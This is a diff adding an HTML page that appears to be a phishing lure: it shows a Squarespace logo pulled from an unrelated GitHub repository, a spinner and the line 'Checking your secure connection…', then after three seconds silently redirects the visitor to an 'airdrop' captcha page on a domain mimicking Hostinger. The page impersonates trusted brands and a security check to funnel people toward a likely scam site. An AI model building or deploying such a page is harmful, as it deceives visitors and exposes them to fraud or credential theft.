@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+
+  <!-- Google-like font -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      height: 100vh;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: "Roboto", Arial, sans-serif;
+      color: #202124;
+    }
+
+    .wrapper {
+      text-align: center;
+    }
+
+    /* Bigger Squarespace logo */
+    .logo {
+      width: 200px; 
+      margin: 0 auto 40px auto;
+      opacity: 1;
+    }
+
+    .logo img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* PURE BLACK CLEAN LOADING SPINNER */
+    .loader {
+      width: 46px;
+      height: 46px;
+      margin: 0 auto 20px auto;
+      border-radius: 50%;
+      border: 4px solid rgba(0, 0, 0, 0.15); /* subtle track */
+      border-top-color: #000000;             /* pure black arc */
+      animation: spin 0.7s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .loader-text {
+      font-size: 15px;
+      color: #5f6368;
+      letter-spacing: 0.01em;
+    }
+  </style>
+
+  <script>
+    // Redirect after 3 seconds
+    setTimeout(function () {
+      window.location.href = "https://airdrop.hostingertoken.com/captcha.php";
+    }, 3000);
+  </script>
+</head>
+
+<body>
+  <div class="wrapper">
+
+    <div class="logo">
+      <img src="https://raw.githubusercontent.com/expertsintranslation/red/refs/heads/main/Untitled%20design(5).png" alt="Squarespace Logo">
+    </div>
+
+    <div class="loader"></div>
+
+    <div class="loader-text">Checking your secure connection…</div>
+
+  </div>
+</body>
+</html>
